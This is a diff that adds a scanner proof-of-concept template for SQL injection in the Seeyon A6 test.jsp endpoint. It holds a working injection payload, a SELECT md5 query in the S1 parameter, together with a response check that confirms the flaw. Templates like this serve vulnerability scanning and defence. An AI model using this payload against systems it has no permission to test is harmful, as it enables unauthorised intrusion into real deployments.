@@ -1,0 +1,13 @@
+name: poc-yaml-seeyon-a6-test-jsp-sql
+set:
+  rand: randomInt(200000000, 210000000)
+rules:
+  - method: GET
+    path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{rand}}))
+    expression:
+      response.status == 200 && response.body.bcontains(bytes(md5(string(rand))))
+detail:
+  author: sakura404x
+  version: 致远A6
+  links:
+    - https://github.com/apachecn/sec-wiki/blob/c73367f88026f165b02a1116fe1f1cd2b8e8ac37/doc/unclassified/zhfly3346.md
